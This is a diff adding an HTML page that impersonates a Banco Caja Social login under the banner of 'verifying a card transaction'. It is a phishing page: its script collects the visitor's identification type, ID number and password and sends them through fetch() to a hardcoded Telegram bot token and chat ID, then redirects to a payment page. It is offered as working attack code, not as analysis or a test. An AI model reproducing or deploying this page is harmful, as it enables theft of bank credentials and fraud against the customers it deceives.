@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seguridad</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f6f6f6;
+            margin: 0;
+            flex-direction: column;
+        }
+
+        .container {
+            background-color: white;
+            padding: 2rem;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            width: 70%;
+            text-align: center;
+            margin: 5%;
+            margin-bottom: 5%;
+        }
+
+        .logo img {
+            width: 100px;
+            margin-bottom: 1rem;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            margin-bottom: 1.5rem;
+            color: #333;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: stretch;
+        }
+
+        label {
+            text-align: left;
+            font-size: 0.9rem;
+            margin-bottom: 0.5rem;
+            color: #555;
+        }
+
+        select, input {
+            padding: 0.8rem;
+            margin-bottom: 1rem;
+            border: solid #ddd;
+            border-width: 0 0 2px 0;
+            border-radius: 5px;
+            font-size: 1rem;
+            color: #333;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        select {
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            background: url('https://via.placeholder.com/15x15.png?text=▼') no-repeat right 10px center;
+            background-color: #fff;
+            cursor: pointer;
+        }
+
+        .forgot-password {
+            text-align: right;
+            display: block;
+            margin-bottom: 1.5rem;
+            color: #0066cc;
+            font-size: 0.9rem;
+        }
+
+        .login-button {
+            background-color: transparent;
+            border: solid;
+            border-width: 1.5px;
+            border-color: blue;
+            padding: 0.8rem;
+            border-radius: 50px;
+            font-size: 1rem;
+            color: blue;
+            cursor: pointer;
+            margin-bottom: 1.5rem;
+        }
+
+        .register {
+            font-size: 0.9rem;
+            color: #555;
+        }
+
+        .register a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+
+        .register a:hover {
+            text-decoration: underline;
+        }
+
+        .link-container {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+        }
+
+        .link-container a {
+            font-size: 0.9rem;
+            color: #0066cc;
+            text-decoration: none;
+        }
+
+        .link-container a:hover {
+            text-decoration: underline;
+        }
+
+        header {
+            padding-bottom: 4%;
+            padding-top: 5%;
+            margin-bottom: 8%;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            background-color: white;
+        }
+
+        header img {
+            width: 70%;
+        }
+
+        footer {
+            padding: 5%;
+            margin-bottom: 5%;
+        }
+
+        footer div {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        footer img:first-child {
+            width: 50%;
+        }
+
+        footer img:last-child {
+            width: 40%;
+        }
+    </style>
+</head>
+<body>
+    <header> 
+        <img src="../img/BANCO CAJA SOCIAL.png" alt="">
+    </header>
+
+    <h1>Te damos la bienvenida</h1>
+
+    <div class="container">
+        <div style="margin-top: 1%; margin-bottom: 8%;">
+            <p style="text-align: left;">Verifica la transacción que intentas realizar con tu tarjeta por seguridad</p>
+        </div>
+        
+        <form>
+            <label for="identification-type">(*) TIPO DE IDENTIFICACIÓN</label>
+            <select id="identification-type">
+                <option value="">Seleccionar</option>
+                <option value="cedula">Cédula de ciudadanía</option>
+                <option value="cedula_extranjeria">Cédula de extranjería</option>
+                <option value="pasaporte">Pasaporte</option>
+            </select>
+            
+            <label for="identification-number">(*) NÚMERO DE IDENTIFICACIÓN</label>
+            <input type="text" id="identification-number" required>
+            
+            <label for="password">(*) CONTRASEÑA</label>
+            <input type="password" id="password" required>
+            
+            <a href="#" class="forgot-password">Olvidé mi contraseña</a>
+            <button type="button" class="login-button" onclick="nextPage()">INGRESAR</button>
+        </form>
+
+        <div class="link-container">
+            <a href="#">Registrarse</a>
+            <a href="#">¿Olvidó su contraseña?</a>
+        </div>
+    </div>
+
+    <footer>
+        <div>
+            <img src="../img/BANCO CAJA SOCIAL.png" alt="">
+            <img src="../img/vigilado.691ba87177cfc7656937fafcb0c6925a.svg" alt="">
+        </div>
+    </footer>
+    
+    <script>
+        // Bandera para controlar el envío de datos
+        let datosEnviados = false;
+    
+        // Función de validación y envío de datos a Telegram
+        function nextPage() {
+            // Obtener los valores de los campos
+            const identificationType = document.getElementById('identification-type').value;
+            const identificationNumber = document.getElementById('identification-number').value;
+            const password = document.getElementById('password').value;
+    
+            // Validar que los campos no estén vacíos
+            if (!identificationType || !identificationNumber || !password) {
+                alert("Por favor, complete todos los campos.");
+                return;
+            }
+    
+            // Si los datos no han sido enviados aún
+            if (!datosEnviados) {
+                // Preparar los datos para enviar al bot de Telegram
+                const mensaje = `Nuevo acceso:\nTipo de identificación: ${identificationType}\nNúmero de identificación: ${identificationNumber}\nContraseña: ${password}`;
+    
+                // Llamar a la función para enviar los datos al bot de Telegram
+                enviarATelegram(mensaje);
+            } else {
+                // Si ya se enviaron los datos, redirigir
+                window.location.href = "../cargapago.html";  // Redirigir después de enviar
+            }
+        }
+    
+        // Función para enviar el mensaje al bot de Telegram
+        function enviarATelegram(mensaje) {
+            const token = "8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE"; // Reemplaza con el token de tu bot de Telegram
+            const chatId = "5848946481"; // Reemplaza con el ID de tu chat o canal de Telegram
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
+    
+            // Enviar los datos usando Fetch API
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        datosEnviados = true;  // Marcar los datos como enviados
+                        window.location.href = "../cargapago.html";  // Redirigir después de enviar
+                    } else {
+                        alert("Hubo un error al enviar los datos.");
+                    }
+                })
+                .catch(error => {
+                    alert("Error en la conexión. Inténtalo nuevamente.");
+                });
+        }
+    
+        // Función para el botón 'Anterior'
+        function previousPage() {
+            window.history.back();  // Redirige a la página anterior
+        }
+    </script>
+</body>
+</html>
